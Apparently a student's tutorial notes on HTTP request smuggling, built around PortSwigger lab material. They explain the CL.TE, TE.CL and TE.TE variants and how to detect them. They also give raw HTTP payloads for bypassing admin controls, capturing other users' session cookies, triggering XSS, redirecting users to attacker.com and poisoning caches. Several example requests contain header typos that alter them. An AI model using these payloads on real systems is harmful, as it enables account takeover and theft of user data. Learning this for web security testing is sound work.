# HTTP request Smuggling
- HTTP request smuggling is technique for interfering with the way a web site processes sequence of `HTTP requests` that are received from one or more users.
- this vulnerabilities is `critical` in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data and directly compromise other application
![[HTTP-request-smuggling.png]]

## What happens in HTTP request Smuggling Attack
- now days application frequently employ chains of `HTTP servers` between Users and the application logic.
- Users send request to `frontend server`(load balancer or reverse proxy) and this server forwards the requests to `one or more backend-servers`, this type of architecture is increasingly common, due to `cloud-based applicatoins`
- when `front-end server` forwards HTTP request to `back-end server`it typically sends several request over the same back-end `network connection`, since this is more efficient and performant.
- HTTP requests are sent one after another and receiving sever parse the `HTTP request headers to determine where one request ends and the next begins.`
- In this situation, it is crucial that the `front-end system` and `back-end system` agree about the `boundries between requests` otherwise , attacker able to sent ambiguous request that gets interpreted differently by the `front-end` and `back-end ` systems.
`example:`
![[Http-request-smuggling-example.png]]
- here attacker causes part of their front-end request to be interpreted by the `back-end servers` as the start of the next request, it is effectively prepended to next request,  `this is request smuggling attacks`

## How HTTP request smuggling Vulnerabilities arise.
- most of this vulnerability arise because HTTP specify where a request ends,
`Content-Length` header and `Transfer-Encoding` headers
- The `Content-Length:`header is straight forward, it specify the length of the message body in `bytes`
`example:`
```js
POST /search HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

query=smuggling
```

- The `Transfer-Encoding:` header can be used to specify that the message body uses chunked encoding, this means message body contains `1 or more` chunks of data.
- Each Chunk consists of the Chunk size in `bytes expressed in Hexadecial` followed by `newline` followed by `chunk contents`, and the message is terminated with a chunk of `size zero`.
`example:` 
```js
POST /search HTTP/1.1
Host: domain.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

F
query=smuggling
0
```
here `F` is 15 in hex and chunk content size if also 15 and then chunk value and after we define `0`that is next chunk message size and this lead to `request termination`.

- since HTTP specification provides two different methods for specifying the length of HTTP messages, if is possible to single message to use both methods at once and they conflict with each others
-  TO prevent this `HTTP specification` Ignore `Content-Length` header when there is two methods are provided
-  This  is efficient when only one server in the back-end there but if there is `Two or more server` are chained together then there a problem will arise due to 
	-  some servers don't support `Transfer-Encoding` header in request.
	-  Some servers don't support `Transfer-Encoding` header can be induced not to process it, if the header is obfuscated in some way.
# Performing HTTP request Smuggling attack
- it involves placing both `Content-Length` and `Tracnsfer-Encoding` header in the single HTTP request and manipulating these so that the `front-end` and `back-end` server process the request differently.
- this is depends on the behavior of two servers(CL=Content-length, TE=Transfer-Encoding)
	- CL.TE: the `front-end` use `Content-Length` and `back-end` use `Transfer-Encoding` header
	- TE.CL: `Front-end` use `Transfer-Encoding` and `back-end` use `Contetn-Length` header
	- TE.TE: `front-end` and `back-end` severs both support `Transfer-Encoding` header but one of the server can be induced not to process it by `obfuscating` the header in some way.

## CL.TE Vulnerabilities(Content-length, Transfer-Encoding)
- here Front-end Use `Content-Length` header and back-end use `Transfer-Encoding` header 
- we simply smuggle it like this.
```js
POST / HTTP/1.1
Host: vuln-web.com
Content-Length: 13
Transfer-Encoding: chunked

0
SMUGGLED
```

- THE front-end server process `Content-Length` and determine that the request body is `13 bytes` long, upto the end of the smuggled and forward the request to back-end, 
- The back-end process `Transfer-Encoding` header and treats the message body as using `chunked encoding`, it process the first chunk, which is stated to be `Zero` length and so it terminating request.
- the following bytes `smuggled` are left unprocessed, and back-end server will treat as start of new request in sequence

## TE.CL Vulnerabilities
- Here front-end uses the `Transfer-Encoding` header and the back-end uses `Content-Length` header
```js
POST / HTTP/1.1
Host: vuln-web.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
#### Note
```
- To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
- You need to include the trailing sequence `\r\n\r\n` following the final `0`. this means press enter key 2 times after writing 0
```

- the front-end process `transfer-encoding` and treats the message body using `chunked encoding`,which is 8 byte long up to `smuggled` after that it terminates the request due to `zero chunk`
-  back-end process `Content-length`which is 3 bytes and consider message body up to `8` and rest of is like new request.

## TE.TE Behavior: Obfuscating TE header
- front-end and back-end supports `Transfer-Encoder` header, but one of the servers can be induced not to `obfuscating` the header in some way
there is many ways to `obfuscate` the `Transfer-Encoding` header
`example:` 
```js
Transfer-Emcoding: xchunked

Transfer-Encoding: chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: [tab]chunked

[space]Transfer-Encoding: chunked

X; X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

To uncover a TE.TE vulnerability, it is necessary to find some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the other server ignores it.

Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated `Transfer-Encoding` header, the remainder of the attack will take the same as CL.TE and TE.CL


# Finding HTTP request Smuggling Vulnerabilities

## Finding HTTP request Smuggling Vulnerabilities using Timing Techniques
- effective way to detect HTTP request smuggling vulnerabilities is send request that will cause a time delay in the application's response, if vulnerability is present.

## Finding CL.TE VUlnerabilities using Timing techniques
- if application vulnerable to CL.TE then request like following will often cause time delay.
```js
POST  / HTTP/1.1
Host: vuln-web.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
since front-end use Content-length header it forwards request to the back-end, Omitting `X`. 
The back-end server uses `Transfer-Encoding` header, process the first chunk, and then waits for the next chunk to arrive, this will cause `observable time delay`

## Finding TE.CL Vulnerability using timing Technique
- if it vulnerable it TE.CL then the following request will cause time delay
```js
POST / HTTP/1.1
Host: vuln-web.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
since the front-end server use `Transfer-encoding` header it will forward only part of this request, omitting `X`.
back-end server uses `Content-Length` header, expects more content in the message body and waits for the remaining content to arrive, this will cause observable time delay.

#### NOTE
```
The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.
```

## Confirming HTTP Request Smuggling Using differential Response
- when a probable request smuggling vulnerability has been detected, we need to obtain further evidence for this vulnerability by exploiting it to trigger difference in `Contents of application's response`
- this involves sending 2 request
	- `Attack` request that is designed with the processing of the next request.
	- Normal request
- if the response to the normal request contains the expected interference, then vulnerability is confirmed
```js
POST /search HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencode
Content-Length: 15

Query=smuggling 
```
this request receives `HTTP response` with status code 	200 , containing some search results.
- the `attack request` that needed to interfere with this requests depends on the variant of request smuggling is present.
### Confirming CL.TE vulnerabilities using Differential responses
- for CL.TE vuln. we need to send attack request like this 
```js
POST /search HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0


GET /404 HTTP/1.1
foo: x
```
IF attack is successful then last two lines treated by back-end server belonging to `second request`
- this cause normal request to look like thi
```
GET /404 HTTP/1.1
foo: xPOST /search HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 15
 
query=smuggling
```
since the request is now contain invalid URL the server responded with `404`

### Confirming TE.CL Vulnerability using differential Response
- attack request
```js
POST /search HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

```
- if the attack is successful, all thing after `GET /404` treated by the back-end is `second request` and since 2nd request now contain invalid url, server responded with `404`

### NOTE 
some important Consideration while testing/attempting for request smuggling 

-   The "attack" request and the "normal" request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.
-   The "attack" request and the "normal" request should use the same URL and parameter names, as far as possible. This is because many modern applications route front-end requests to different back-end servers based on the URL and parameters. Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work.
-   When testing the "normal" request to detect any interference from the "attack" request, you are in a race with any other requests that the application is receiving at the same time, including those from other users. You should send the "normal" request immediately after the "attack" request. If the application is busy, you might need to perform multiple attempts to confirm the vulnerability.
-   In some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail. This is an additional reason why you might need to try several times before a vulnerability can be confirmed.
-   If your attack succeeds in interfering with a subsequent request, but this wasn't the "normal" request that you sent to detect the interference, then this means that another application user was affected by your attack. If you continue performing the test, this could have a disruptive effect on other users, and you should exercise caution.


# Exploiting Request Smuggling Vulnerability
## Using HTTP request Smuggling to BYpass Front-end Security Control
- in some application, the `front-end` web server used to implement some security controls, deciding whether to allow individual requests to be processed.
`example:` 
- application use front-end server to implement `access control` restriction, it only forwards the request if the user is authorized to access requested URL
- back-end server response to every request without checking further authorization.
- in this situation `request smuggling ` used to bypass the `access control` by smuggling restricted URL
`Example` current use have permission to `/home` but not `/admin`this can be bypass by 
```js
POST /home HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vuln-web.com
foo: x
```
 here front-end server see `/home`request and send to back-end,  and back-end server see `/admin` to second request and give access to resource.
- the final payload
```js
POST / HTTP/1.1
Host: ace51f5e1ea45686807f30cc006500de.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Transfer-Encoding: chunked
Content-Length: 145

0


GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10


x=
```
 #### NOTE
 - some times we need to change Host, or other parameter sine they only accessible using `internal network`
 -  Done forget to put orignal chunk size in Hex unless get Error while smuggling `TE.CL`

## Revealing Front-end Request Rewriting
 - in many application `front-end` performs some `rewriting` of the request before they are forwarded to the `back-end` server.
 - typically by adding some additional headers
 `example:`
	 - terminates the `TLS` connection and add some headers describing the protocol and ciphers that were used
 	- add `X-Forwarded-For:`header containing the user's IP address
 	- Determine the user's ID on their Session token and add a header identifying User 
	- add some `sensitive information` that is of interest for other attacks
 - in some case, if our smuggled requests are missing some headers that are normally added by the `front-end server` , then the `back-end` might didn't process the requests in the normal way, resulting Smuggled requests failing to have the intended effects.
 - there is often a way to revel exactly how the front-end server is rewriting requests
	 - Find the `post` request that reflects the value of a request parameter into the application's response
	 - shuffle the parameters so that the reflected parameter appears last in the message body
	 - Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form we want to revel.
`example:`
- suppose an application has a login function that reflects the value of the `email` parameter
```js
POST /login HTTP/1.1
Host: vuln-web.com
Content-Type: appplication/x-www-form-urlencoded
Content-Length: 28

email=dk@hello.user.net
```
this results in the response containing following
` <input id="email" value="dk@hello.user.net" type="text">`

- here we can use the following request smuggling to revel rewriting that is performed by the `front-end`
```js
POST / HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Legth: 123
Transfer-Encoding: chunked


0

POST /login HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100


email= we send seconde request that is reflected here
```
the request will be rewritten by the front-end server to include the additional headers, and then the back-end server will process the smuggled request and treat the rewritten second request as being the value of the `email` parameter, it will then reflect this value back in response to the second request.
```js
< input id="email" value="POST /login HTTP/1.1  
Host: vulnerable-website.com  
X-Forwarded-For: 1.3.3.7  
X-Forwarded-Proto: https  
X-TLS-Bits: 128  
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256  
X-TLS-Version: TLSv1.2  
x-nr-external-service: external etc"
```

#### NOTE
Since the final request is being rewritten, you don't know how long it will end up. The value in the `Content-Length` header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest.
[lab portswigger](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)

## Capturing Other User's Requests
- if the application contains's any kind of functionality that allows textual data to be stored and retrieved, then `HTTP request smuggling` used to capture the content's of other users request.
- this will likely include `session token`, and `other sensitive information submitted by the user`, suitable functions to use as the vehicle for this attack would be `comments,emails, profile description, screen names ` etc
- TO perform the attack, we need to smuggle a request that submits data to the `storage function`,  with the parameter containing the data positioned last in the request.
- the next request is processed by the `back-end` will be appended to the smuggled request with the result that the other user's raw request gets stored.
`Example:` suppose an application uses the following request to submit a blog comment, which will be stored and displayed on the blog
```js
POST /post/comment HTTP/1.1
Host: vuln-wen=b.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Cookie: session=qwertsg6rtrq5bt54rfe

csrf=kshtb934wy8rbhcq2liwtrgb&postId=2&comment=my-comment&name=myname&email=dk@hello.net&website=https://normal.com
```
here we perform request smuggling Attack which smuggle the data storage request to the `back-end` server
```js
GET / HTTP/1.1
Host: vuln-web.xom
Transfer-Emcoding: chunked
Content-Length: 324


0


POST /post/comment HTTP/1.1
Host: vuln-web.xom
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=sajkag7wryfb34wliue

csrf=v45b8qyl8yerih3nlewir&postId=2&name=dk&email=dk@dk.net&website=https://helo.net&comment=
```
here the victims request stored to the comment section of attacker.

#### NOTE
- One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the `&` character, meaning that the content that is stored from the victim user's request will end at the first `&`, which might even appear in the query string.

## Using HTTP request Smuggling to Exploit XSS
- if an application is vulnerable to request smuggling and also contains reflected XSS , we use a request smuggling attack to hit other users of the application.
	- it required no interaction with victim users, we don't need to feed them a URL and wait to visit them, we just need to smuggle the request that is processing by the back-end server
	- it can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in normal `reflected XSS`
`example:` there is `reflected xss vuln in User-Agent` we exploit this using request smuggling 
```js
POST / HTTP/1.1
Host: vuln-web.com
Content-Length: 63
Transfer-Encoding: chunked

0


POST / HTTP/1.1
User-Agent: <script>alert(0)</script>
foo: x
```
the next user who visit the site will trigger `XSS`

## Using HTTP Request Smuggling To turn On-Site Redirection into an Open-redirect
- many application preforms on-site redirection from one URL to another and place the hostname from the request's `Host header` into the redirect `URL`.
`example:` default behavior of `Apache ` and `IIS` servers, where a request for a folder without `/` receives a redirect to the same folder including `/` 
```js
GET /home HTTP/1.1
Host: vuln-web.com

HTTP/1.1 301 Moved Permantely
Location: https://vuln-web.com/home/
```
this is harmless, but can be exploited in a request smuggling attack to redirect other users to an external domain.
```js
POST / HTTP/1.1
Host: vuln-web.com
Content-Length: 53
Transfer-Encoding: chunked

0


GET /home HTTP/1.1
Host: attacker.com
any: X
```
this will trigger a redirect to attacker's application , and will affect the next user who make request to application.


## Using HTTP request smuggling to perform Web Cache Poisoning 
- it might possible to exploit HTTP request smuggling to perform a `web cache poisoning` attack. 
- if any part of the `front-end` infrastructure performs caching of content, then it might be possible to poison the cache with off-site response.
- this make attack persistent, affecting any user who subsequently request the affected URL
```js
POST / HTTP/1.1
Host: vuln-web.com
Content-Length: 59
Transfer-Encoding: chunked

0


GET /home HTTP/1.1
Host: attacker.com
foo: 
```
- the smuggled request reaches the `back-end` server, which response as before with the off-site redirect. 


## using HTTP Request smuggling To perform Web Cache Deception
#### Difference between web cache Poisoning and Web cache Deception
- **web cache Poisoning:** the attacker cause the application to store some malicious content in the cache, and this content is served from the cache to other application users.
- **web cache deception:** the attacker cause the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

in this variant, the attacker smuggle a request that returns some sensitive user-specific content.
`Example:`
```js
POST / HTTP/1.1
Host: vuln-web.com
Content-Length: 34
Transfer-Encoding: chunked


0


GET /private/message HTTP/1.1
FOO: x
```

- in next Request from another user that is forwarded to the back-end server will be appended to the smuggled request including session cookies and the other headers
- the back-end server responds to this request in the normal way. The URL in the request is for the user's private messages and the request is processed in the context of the victim user's session. the front-end server caches this response against what it believes it the URL in the second request.
- attacker visits the static URL and receives the sensitive content that is returned from the cache.
- An important caveat here is that the attacker doesn't know the URL against which the sensitive content will be cached, since this will be whatever URL the victim user happened to be requesting when the smuggled request took effect. The attacker might need to fetch a large number of static URLs to discover the captured content.
